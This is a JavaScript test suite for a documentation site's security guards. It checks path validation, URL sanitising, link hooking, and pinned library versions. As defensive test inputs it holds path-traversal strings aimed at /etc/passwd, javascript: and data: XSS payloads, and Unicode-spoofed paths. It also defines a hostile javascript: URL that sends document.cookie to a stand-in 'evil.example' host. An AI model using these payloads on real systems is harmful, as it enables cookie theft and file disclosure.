import { describe, it, expect, vi } from 'vitest';
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { isSafePath, safeUrl, resolveBase, resolvePath, hookLinks, safeFetch } from '../modules/security.js';
import { state } from '../modules/state.js';

// isSafePath reads the type registry, which arrives with registry.json.
state.types = [
  { name: 'policy', prefix: 'pol', folder: 'policies', dated: false, immutable: false },
  { name: 'standard', prefix: 'std', folder: 'standards', dated: false, immutable: false },
  { name: 'runbook', prefix: 'rb', folder: 'runbooks', dated: false, immutable: false },
  { name: 'gap', prefix: 'gap', folder: 'gaps', dated: true, immutable: false },
];

describe('isSafePath', () => {
  it('allows valid domain doc paths', () => {
    expect(isSafePath('policies/pol-info-sec.md')).toBe(true);
    expect(isSafePath('runbooks/rb-rotate-key.md')).toBe(true);
  });

  it('allows system paths', () => {
    expect(isSafePath('gaps/2026/gap-mfa-consoles.md')).toBe(true);
  });

  it('allows capabilities.yml', () => {
    expect(isSafePath('model/capabilities.yml')).toBe(true);
  });

  it('allows schema JSON', () => {
    expect(isSafePath('keel/schemas/frontmatter.schema.json')).toBe(true);
  });

  it('allows root-level known files', () => {
    expect(isSafePath('config.yml')).toBe(true);
    expect(isSafePath('publish.yml')).toBe(true);
    expect(isSafePath('keel/design.md')).toBe(true);
    expect(isSafePath('keel/glossary.md')).toBe(true);
    // A bare framework filename no longer resolves: the tree is part of the path.
    expect(isSafePath('design.md')).toBe(false);
  });

  it('blocks path traversal with ..', () => {
    expect(isSafePath('../etc/passwd')).toBe(false);
    expect(isSafePath('policies/../../../etc/passwd')).toBe(false);
    expect(isSafePath('policies/..%2F..%2Fetc/passwd.md')).toBe(false);
  });

  it('blocks double slashes', () => {
    expect(isSafePath('policies//test.md')).toBe(false);
  });

  it('blocks backslashes', () => {
    expect(isSafePath('policies\\test.md')).toBe(false);
  });

  it('blocks absolute paths', () => {
    expect(isSafePath('/etc/passwd')).toBe(false);
  });

  it('blocks null bytes', () => {
    expect(isSafePath('policies/test\x00.md')).toBe(false);
  });

  it('blocks control characters', () => {
    expect(isSafePath('policies/test\n.md')).toBe(false);
  });

  it('blocks paths without allowed extensions', () => {
    expect(isSafePath('policies/test.html')).toBe(false);
    expect(isSafePath('policies/test.js')).toBe(false);
    expect(isSafePath('policies/test')).toBe(false);
  });

  it('blocks unknown top-level directories', () => {
    expect(isSafePath('unknown/test.md')).toBe(false);
    expect(isSafePath('.git/config.yml')).toBe(false);
  });

  it('blocks unknown root files', () => {
    expect(isSafePath('secret.md')).toBe(false);
    expect(isSafePath('.env.yml')).toBe(false);
  });

  it('rejects non-string input', () => {
    expect(isSafePath(null)).toBe(false);
    expect(isSafePath(undefined)).toBe(false);
    expect(isSafePath(42)).toBe(false);
  });
});

describe('safeUrl', () => {
  it('allows http URLs', () => {
    expect(safeUrl('http://example.com')).toBe('http://example.com');
  });

  it('allows https URLs', () => {
    expect(safeUrl('https://tickets.example.com/browse/SEC-123')).toBe('https://tickets.example.com/browse/SEC-123');
  });

  it('blocks javascript URLs', () => {
    expect(safeUrl('javascript:alert(1)')).toBeNull();
  });

  it('blocks data URLs', () => {
    expect(safeUrl('data:text/html,<script>alert(1)</script>')).toBeNull();
  });

  it('blocks relative paths', () => {
    expect(safeUrl('../foo')).toBeNull();
  });

  it('rejects non-string input', () => {
    expect(safeUrl(null)).toBeNull();
    expect(safeUrl(undefined)).toBeNull();
  });
});

describe('safeUrl edge cases', () => {
  it('blocks protocol smuggling', () => {
    expect(safeUrl('javascript:alert(1)//http://')).toBeNull();
  });

  it('is case insensitive for protocol', () => {
    expect(safeUrl('HTTPS://example.com')).toBe('HTTPS://example.com');
    expect(safeUrl('Http://example.com')).toBe('Http://example.com');
  });

  it('blocks ftp and other schemes', () => {
    expect(safeUrl('ftp://files.example.com')).toBeNull();
    expect(safeUrl('blob:http://example.com')).toBeNull();
    expect(safeUrl('file:///etc/passwd')).toBeNull();
  });

  it('handles empty string', () => {
    expect(safeUrl('')).toBeNull();
  });
});

describe('resolvePath', () => {
  it('strips hash fragments', () => {
    expect(resolvePath('01-grc/test.md#section')).toBe('01-grc/test.md');
  });

  it('strips query strings', () => {
    expect(resolvePath('01-grc/test.md?q=1')).toBe('01-grc/test.md');
  });

  it('returns empty string for paths with ..', () => {
    expect(resolvePath('../etc/passwd')).toBe('');
    expect(resolvePath('foo/../bar.md')).toBe('');
    expect(resolvePath('01-grc/../../../etc/passwd')).toBe('');
  });

  it('normalizes . segments', () => {
    expect(resolvePath('./foo/bar.md')).toBe('foo/bar.md');
  });

  it('removes empty segments', () => {
    expect(resolvePath('foo//bar.md')).toBe('foo/bar.md');
  });

  it('handles simple paths', () => {
    expect(resolvePath('01-grc/policies/POL-test.md')).toBe('01-grc/policies/POL-test.md');
  });

  it('handles empty input', () => {
    expect(resolvePath('')).toBe('');
  });
});

describe('hookLinks', () => {
  it('leaves external http links alone', () => {
    const container = document.createElement('div');
    const a = document.createElement('a');
    a.setAttribute('href', 'https://example.com');
    container.appendChild(a);
    hookLinks(container, function() {});
    expect(a.getAttribute('href')).toBe('https://example.com');
  });

  it('leaves mailto links alone', () => {
    const container = document.createElement('div');
    const a = document.createElement('a');
    a.setAttribute('href', 'mailto:test@example.com');
    container.appendChild(a);
    hookLinks(container, function() {});
    expect(a.getAttribute('href')).toBe('mailto:test@example.com');
  });

  it('strips href from javascript: links', () => {
    const container = document.createElement('div');
    const a = document.createElement('a');
    a.setAttribute('href', 'javascript:alert(1)');
    container.appendChild(a);
    hookLinks(container, function() {});
    expect(a.hasAttribute('href')).toBe(false);
  });

  it('strips href from unknown protocol links', () => {
    const container = document.createElement('div');
    const a = document.createElement('a');
    a.setAttribute('href', 'vbscript:msgbox(1)');
    container.appendChild(a);
    hookLinks(container, function() {});
    expect(a.hasAttribute('href')).toBe(false);
  });

  it('routes safe internal .md links through goFn', () => {
    const container = document.createElement('div');
    const a = document.createElement('a');
    a.setAttribute('href', 'policies/pol-test.md');
    container.appendChild(a);
    const goFn = vi.fn();
    hookLinks(container, goFn);
    a.click();
    expect(goFn).toHaveBeenCalledWith('doc/policies/pol-test.md', expect.anything());
  });

  it('blocks click on unsafe internal paths', () => {
    const container = document.createElement('div');
    const a = document.createElement('a');
    a.setAttribute('href', '../etc/passwd');
    container.appendChild(a);
    const goFn = vi.fn();
    hookLinks(container, goFn);
    const event = new Event('click', { cancelable: true });
    a.dispatchEvent(event);
    expect(goFn).not.toHaveBeenCalled();
    expect(event.defaultPrevented).toBe(true);
  });
});

describe('safeFetch', () => {
  it('rejects blocked paths', async () => {
    await expect(safeFetch('../etc/passwd')).rejects.toThrow('Path blocked by security policy');
  });

  it('rejects non-string paths', async () => {
    await expect(safeFetch(null)).rejects.toThrow('Path blocked by security policy');
  });
});

describe('resolveBase', () => {
  it('sends program content to the program tree', () => {
    expect(resolveBase('policies/pol-info-sec.md')).toBe('../program/');
    expect(resolveBase('model/capabilities.yml')).toBe('../program/');
  });

  it('sends framework material to the keel tree', () => {
    expect(resolveBase('keel/design.md')).toBe('../');
    expect(resolveBase('keel/templates/policy.md')).toBe('../');
    expect(resolveBase('keel/schemas/frontmatter.schema.json')).toBe('../');
  });

  it('keeps the two adrs directories apart', () => {
    // The collision the keel/ prefix exists to solve: both trees have one.
    expect(resolveBase('adrs/adr-x.md')).toBe('../program/');
    expect(resolveBase('keel/adrs/adr-truth-boundaries.md')).toBe('../');
  });
});

/* The served page names the library versions it loads. That line was wrong —
 * it said DOMPurify 3.2.7 and js-yaml 4.1.0 while package.json pinned 3.4.1
 * and 4.3.2 — which is the same failure as the vendored js-yaml that lagged
 * its manifest, only in the documentation rather than the bytes. The bytes
 * have a CI freshness check; this is the one for the sentence. */
describe('the page tells the truth about what it loads', () => {
  it('index.html names the versions package.json pins', async () => {
    const { readFile } = await import('node:fs/promises');
    const pkg = JSON.parse(await readFile('package.json', 'utf8'));
    const html = await readFile('index.html', 'utf8');
    expect(html).toContain('marked ' + pkg.dependencies.marked);
    expect(html).toContain('DOMPurify ' + pkg.dependencies.dompurify);
    expect(html).toContain('js-yaml ' + pkg.dependencies['js-yaml']);
  });

  it('no inline style attribute survives, because the CSP refuses them', async () => {
    const { readFile } = await import('node:fs/promises');
    const html = await readFile('index.html', 'utf8');
    expect(html).not.toMatch(/\sstyle="/);
    // And the policy that makes that true is still the strict one.
    expect(html).toContain("default-src 'none'");
    expect(html).toContain("style-src 'self'");
    expect(html).not.toContain("'unsafe-inline'");
    expect(html).not.toContain("'unsafe-eval'");
  });
});

/* isSafePath was rewritten during the refactor to decide from the type
 * registry and the `keel/` prefix, so it earns a fresh adversarial pass
 * rather than inheriting the old one's confidence. Everything below must be
 * refused: this function is the only thing standing between a hash somebody
 * sent you and a fetch.
 */
describe('isSafePath under attack', () => {
  const REFUSED = [
    ['classic traversal', '../../../etc/passwd'],
    ['traversal mid-path', 'policies/../../etc/passwd.md'],
    ['traversal after a valid prefix', 'keel/../program/config.yml'],
    ['url-encoded traversal', '..%2f..%2fetc%2fpasswd.md'],
    ['double-encoded traversal', '..%252f..%252fetc.md'],
    ['backslash traversal', '..\\..\\windows\\system32.md'],
    ['mixed separators', 'policies\\..\\..\\etc.md'],
    ['absolute path', '/etc/passwd.md'],
    ['absolute with a known folder', '/policies/pol-x.md'],
    ['protocol-relative', '//evil.com/x.md'],
    ['double slash inside', 'policies//pol-x.md'],
    ['a scheme', 'https://evil.com/x.md'],
    ['a file scheme', 'file:///etc/passwd.md'],
    ['a data URI', 'data:text/html,<script>alert(1)</script>'],
    ['a null byte', 'policies/pol-x.md\u0000.png'],
    ['a newline', 'policies/pol-x\u000a.md'],
    ['a carriage return', 'policies/pol-x\u000d.md'],
    ['a tab', 'policies/\u0009pol-x.md'],
    ['a bell character', 'policies/\u0007x.md'],
    ['DEL', 'policies/x\u007f.md'],
    ['an unknown top-level folder', 'secrets/keys.md'],
    ['an unknown root file', 'id_rsa.md'],
    ['a disallowed extension', 'policies/pol-x.exe'],
    ['no extension', 'policies/pol-x'],
    ['an html file', 'policies/pol-x.html'],
    ['a bare keel prefix', 'keel'],
    ['a Cyrillic homoglyph folder', 'p\u043elicies/pol-x.md'],
    ['a full-width solidus', 'policies\uff0fpol-x.md'],
    ['a zero-width space', 'poli\u200bcies/pol-x.md'],
    ['a right-to-left override', 'policies/\u202edm.x-lop.md'],
    ['a space-padded folder', ' policies/pol-x.md'],
    ['an empty string', ''],
    ['not a string', 42],
    ['null', null],
    ['an object with a toString', { toString: () => 'policies/pol-x.md' }],
    ['an array', ['policies/pol-x.md']],
  ];
  REFUSED.forEach(([what, path]) => {
    it('refuses ' + what, () => {
      expect(isSafePath(path)).toBe(false);
    });
  });

  const ALLOWED = [
    ['a document under a type folder', 'policies/pol-x.md'],
    ['a year-partitioned document', 'gaps/2026/gap-x.md'],
    ['a vocabulary file', 'model/domains.yml'],
    ['the config', 'config.yml'],
    ['the publishing contract', 'publish.yml'],
    ['framework material', 'keel/design.md'],
    ['a framework ADR', 'keel/adrs/adr-truth-boundaries.md'],
    ['a shipped schema', 'keel/schemas/frontmatter.schema.json'],
  ];
  ALLOWED.forEach(([what, path]) => {
    it('allows ' + what, () => {
      expect(isSafePath(path)).toBe(true);
    });
  });

  it('blocks before fetching, so a refused path never leaves the site', async () => {
    globalThis.fetch = vi.fn();
    await expect(safeFetch('../../../etc/passwd')).rejects.toThrow(/blocked/i);
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });
});

/* The vendored copy is what the browser runs.
 *
 * `package.json` pins the version, `npm audit` clears that version, and the
 * suite imports from `node_modules` — none of which is the file the page
 * actually loads. The gap between them is invisible to every one of those
 * checks, and it has now opened twice: js-yaml 4.1.1 against a pinned 4.3.2 in
 * September, and DOMPurify 3.4.1 against a pinned 3.4.15 found in this pass.
 *
 * Reading the version out of the vendored file itself is the only check that
 * looks at the artefact being shipped.
 */
describe('the vendored libraries are the versions that were pinned', () => {
  const pkg = JSON.parse(readFileSync(resolve(process.cwd(), 'package.json'), 'utf8'));

  const VENDORED = [
    ['dompurify', 'vendor/purify.min.js', /DOMPurify (\d+\.\d+\.\d+)/],
    ['marked', 'vendor/marked.umd.min.js', /marked v(\d+\.\d+\.\d+)/],
    ['js-yaml', 'vendor/js-yaml.min.js', /js-yaml (\d+\.\d+\.\d+)/],
  ];

  VENDORED.forEach(([name, file, pattern]) => {
    it(`${name} on disk is the version package.json pins`, () => {
      const pinned = (pkg.dependencies || {})[name];
      expect(pinned, `${name} is not pinned in package.json`).toBeTruthy();
      const source = readFileSync(resolve(process.cwd(), file), 'utf8').slice(0, 4000);
      const found = source.match(pattern);
      expect(found, `no version banner in ${file}`).not.toBeNull();
      expect(found[1], `${file} is stale — run scripts/vendor-libs.sh`).toBe(pinned);
    });
  });
});

/* Nothing renders a link the sanitiser would have refused.
 *
 * `safeUrl` existed and was applied at five of eleven places an href is
 * assigned; the other six took the value straight from the registry. Every
 * field involved is constrained to http(s) by the schema, so a *validated*
 * program could not carry a `javascript:` URL — but `kilagen build site` is a
 * documented way to build without validating, and the tool inventory comes
 * from another repository whose schema is asserted by a test suite rather than
 * at build time.
 *
 * This is a sweep rather than a check per call site, so adding a twelfth
 * href cannot quietly escape it.
 */
import { describe as describeUrls, it as itUrls, expect as expectUrls, beforeEach as beforeEachUrls, vi as viUrls } from 'vitest';
import { state as urlState } from '../modules/state.js';

const HOSTILE = 'javascript:fetch("https://evil.example/"+document.cookie)';

/* Built once, at module scope, and only emptied between tests. `nav.js`
   resolves #main and #right when it is first imported, exactly as it does in
   the browser — replacing the body would leave it holding detached elements,
   and every view would then render into nothing. */
document.body.innerHTML = '<div id="main"></div><div id="right"></div><nav id="app-nav"></nav><div id="tree"></div><input id="search">';

describeUrls('no view renders a link to a scheme the guard refuses', () => {
  beforeEachUrls(async () => {
    ['main', 'right', 'tree'].forEach((id) => { document.getElementById(id).textContent = ''; });
    location.hash = '';
    viUrls.spyOn(console, 'error').mockImplementation(() => {});
    globalThis.fetch = viUrls.fn(async () => ({ ok: true, status: 200, text: async () => '# Body' }));
  });

  function plant() {
    /* One standard, one risk and one vendor, each carrying a hostile URL in
       every field that reaches an href. */
    const docs = {
      'standards/std-x.md': {
        path: 'standards/std-x.md', id: 'std-x', type: 'standard', title: 'Standard X',
        status: 'active', owner: 'role-o', source_of_truth: HOSTILE,
        requirements: [{ ref: '1.1', text: 'One', evidence: [{ name: 'A', url: HOSTILE, collected: '2026-01-01' }] }],
      },
      'risks/rsk-x.md': {
        path: 'risks/rsk-x.md', id: 'rsk-x', type: 'risk', title: 'Risk X',
        status: 'active', owner: 'role-o', severity: 'high', tracker: HOSTILE,
      },
      'gaps/2026/gap-x.md': {
        path: 'gaps/2026/gap-x.md', id: 'gap-x', type: 'gap', title: 'Gap X',
        owner: 'role-o', requirement: 'std-x#1.1', found: '2026-01-01', tracker: HOSTILE,
      },
      'vendors/vnd-x.md': {
        path: 'vendors/vnd-x.md', id: 'vnd-x', type: 'vendor', title: 'Vendor X',
        status: 'active', owner: 'role-o', vendor_name: 'X', tier: 'critical',
        certifications: [{ name: 'ISO 27001', url: HOSTILE, verified: '2026-01-01' }],
      },
    };
    Object.assign(urlState, {
      types: [{ name: 'standard', prefix: 'std', folder: 'standards', dated: false },
              { name: 'risk', prefix: 'rsk', folder: 'risks', dated: false },
              { name: 'gap', prefix: 'gap', folder: 'gaps', dated: true },
              { name: 'vendor', prefix: 'vnd', folder: 'vendors', dated: false }],
      model: { domains: [], capabilities: [], systems: [], risk_taxonomy: {} },
      coverage: { pci_dss: { 1: { coverage: 'mapped', requirements: ['std-x#1.1'], gaps: [], exceptions: [] } } },
      requirements: { 'std-x#1.1': { standard: 'std-x', ref: '1.1', text: 'One', gaps: [], exceptions: [] } },
      publish: { destinations: {}, defaults: {} }, schedule: [], frameworkAdrs: [],
      frameworks: { pci_dss: { name: 'PCI DSS', resources: [{ name: 'Bad', url: HOSTILE }] } },
      tools: { 'iam.idp': { updated: '2026-01-01', tools: [{ name: 'T', url: HOSTILE, license: 'proprietary', note: 'n' }] } },
      collectors: {},
      fmCache: docs,
      idToPath: Object.fromEntries(Object.values(docs).map((d) => [d.id, d.path])),
      allDocs: Object.values(docs).map((d) => ({ path: d.path, name: d.path.split('/').pop() })),
      bodyCache: {}, expandedSections: {}, currentDoc: '', currentView: 'home',
      config: { name: 'Hostile', repo: '', organization: null, frameworks: [{ id: 'pci_dss' }] },
    });
  }

  const RENDERS = [
    ['a standard', async () => (await import('../modules/views/doc.js')).navigateDoc('standards/std-x.md')],
    ['a standard, evidence tab', async () => {
      location.hash = 'doc/standards/std-x.md?tab=evidence';
      return (await import('../modules/views/doc.js')).navigateDoc('standards/std-x.md');
    }],
    ['a risk', async () => (await import('../modules/views/doc.js')).navigateDoc('risks/rsk-x.md')],
    ['a gap', async () => (await import('../modules/views/doc.js')).navigateDoc('gaps/2026/gap-x.md')],
    ['a vendor', async () => (await import('../modules/views/doc.js')).navigateDoc('vendors/vnd-x.md')],
    ['the evidence page', async () => (await import('../modules/views/evidence.js')).renderEvidenceLens()],
    ['the audit pack', async () => (await import('../modules/views/audit.js')).renderAudit('pci_dss')],
    ['a framework', async () => (await import('../modules/views/compliance.js')).renderCompliance('pci_dss')],
    ['the tool inventory', async () => (await import('../modules/views/tools.js')).renderTools()],
  ];

  RENDERS.forEach(([name, render]) => {
    itUrls(name, async () => {
      plant();
      await render();
      const hrefs = [...document.querySelectorAll('a[href]')].map((a) => a.getAttribute('href'));
      const bad = hrefs.filter((h) => !/^https?:\/\//i.test(h));
      expectUrls(bad, `${name} rendered a link the guard should have refused`).toEqual([]);
      // And the text is still shown, so guarding does not silently hide a fact.
      expectUrls(document.getElementById('main').textContent.length).toBeGreaterThan(0);
    });
  });
});
